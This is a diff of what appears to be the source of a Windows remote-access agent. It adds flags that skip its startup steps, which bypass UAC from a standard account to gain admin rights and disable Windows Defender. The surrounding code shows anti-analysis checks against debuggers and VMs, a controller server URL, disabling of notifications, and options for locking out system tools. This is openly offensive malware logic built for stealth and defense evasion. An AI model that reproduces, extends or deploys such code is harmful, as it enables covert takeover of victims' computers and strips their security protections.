@@ -159,6 +159,8 @@ KEEP_ORIGINAL_PROCESS = True  # TRUE = Don't exit original process after UAC byp
 ENABLE_ANTI_ANALYSIS = False  # FALSE = Disabled (for testing), TRUE = Enabled (exits if debuggers/VMs detected)
 DISABLE_UAC_BYPASS = False  # TRUE = Completely disable UAC bypass attempts (run as admin manually)
 KEEP_SYSTEM_TOOLS_ENABLED = True  # TRUE = Keep CMD, PowerShell, Registry, Task Manager enabled (RECOMMENDED for daily use)
+SKIP_BOOTSTRAP_UAC = True  # TRUE = Skip automatic UAC bypass on startup (RECOMMENDED for testing)
+SKIP_DEFENDER_DISABLE = True  # TRUE = Skip automatic Defender disabling on startup (RECOMMENDED for testing)
 
 # Controller URL override flag (set URL via env)
 USE_FIXED_SERVER_URL = True
@@ -14177,38 +14179,49 @@ if __name__ == "__main__":
             print(f"[STARTUP] WSL routing error: {e}")
         
         # 1. BOOTSTRAP UAC DISABLE (NO ADMIN NEEDED!)
-        print("\n[STARTUP] Step 1: BOOTSTRAP UAC DISABLE (NO ADMIN REQUIRED!)...")
-        print("[STARTUP] This uses UAC bypass to gain admin, then disables UAC!")
-        print("[STARTUP] Works from STANDARD USER account - NO PASSWORD NEEDED!")
-        print("[STARTUP] NOTE: If UAC bypass fails, the agent will continue running normally")
-        try:
-            if bootstrap_uac_disable_no_admin():
-                print("[STARTUP] ✅✅✅ UAC DISABLED SUCCESSFULLY!")
-                print("[STARTUP] ✅ Used UAC bypass - NO ADMIN PASSWORD NEEDED!")
-                print("[STARTUP] ✅ Admin password popups are NOW DISABLED for ALL exe/installers!")
-                print("[STARTUP] ✅ You can now run ANY application without password prompts!")
-            else:
-                print("[STARTUP] ⚠️ Bootstrap UAC bypass failed")
-                print("[STARTUP] ℹ️ Agent will continue running with normal privileges")
-                print("[STARTUP] ℹ️ UAC bypass will retry in background if needed")
-                # DO NOT try fallback methods that might cause UAC prompts
-                # Just continue running - the background thread will retry
-        except Exception as e:
-            print(f"[STARTUP] UAC disable error: {e}")
-            print("[STARTUP] ℹ️ Agent will continue running normally")
-            # Don't print full traceback for UAC failures - it's expected
-            # import traceback
-            # traceback.print_exc()
+        if SKIP_BOOTSTRAP_UAC:
+            print("\n[STARTUP] Step 1: Bootstrap UAC bypass SKIPPED (SKIP_BOOTSTRAP_UAC = True)")
+            print("[STARTUP] ℹ️ Running in safe testing mode")
+            print("[STARTUP] ℹ️ To enable UAC bypass on startup: Set SKIP_BOOTSTRAP_UAC = False")
+            print("[STARTUP] ✅ Agent will continue with current user privileges")
+        else:
+            print("\n[STARTUP] Step 1: BOOTSTRAP UAC DISABLE (NO ADMIN REQUIRED!)...")
+            print("[STARTUP] This uses UAC bypass to gain admin, then disables UAC!")
+            print("[STARTUP] Works from STANDARD USER account - NO PASSWORD NEEDED!")
+            print("[STARTUP] NOTE: If UAC bypass fails, the agent will continue running normally")
+            try:
+                if bootstrap_uac_disable_no_admin():
+                    print("[STARTUP] ✅✅✅ UAC DISABLED SUCCESSFULLY!")
+                    print("[STARTUP] ✅ Used UAC bypass - NO ADMIN PASSWORD NEEDED!")
+                    print("[STARTUP] ✅ Admin password popups are NOW DISABLED for ALL exe/installers!")
+                    print("[STARTUP] ✅ You can now run ANY application without password prompts!")
+                else:
+                    print("[STARTUP] ⚠️ Bootstrap UAC bypass failed")
+                    print("[STARTUP] ℹ️ Agent will continue running with normal privileges")
+                    print("[STARTUP] ℹ️ UAC bypass will retry in background if needed")
+                    # DO NOT try fallback methods that might cause UAC prompts
+                    # Just continue running - the background thread will retry
+            except Exception as e:
+                print(f"[STARTUP] UAC disable error: {e}")
+                print("[STARTUP] ℹ️ Agent will continue running normally")
+                # Don't print full traceback for UAC failures - it's expected
+                # import traceback
+                # traceback.print_exc()
         
         # 2. Disable Windows Defender
-        print("\n[STARTUP] Step 2: Disabling Windows Defender...")
-        try:
-            if disable_defender():
-                print("[STARTUP] ✅ Windows Defender disabled successfully")
-            else:
-                print("[STARTUP] ℹ️ Defender disable failed - will retry in background")
-        except Exception as e:
-            print(f"[STARTUP] ℹ️ Defender disable error (non-critical): {e}")
+        if SKIP_DEFENDER_DISABLE:
+            print("\n[STARTUP] Step 2: Defender disable SKIPPED (SKIP_DEFENDER_DISABLE = True)")
+            print("[STARTUP] ℹ️ Running in safe testing mode")
+            print("[STARTUP] ℹ️ To disable Defender: Set SKIP_DEFENDER_DISABLE = False")
+        else:
+            print("\n[STARTUP] Step 2: Disabling Windows Defender...")
+            try:
+                if disable_defender():
+                    print("[STARTUP] ✅ Windows Defender disabled successfully")
+                else:
+                    print("[STARTUP] ℹ️ Defender disable failed - will retry in background")
+            except Exception as e:
+                print(f"[STARTUP] ℹ️ Defender disable error (non-critical): {e}")
         
         # 3. Disable Windows notifications
         print("\n[STARTUP] Step 3: Disabling Windows notifications...")
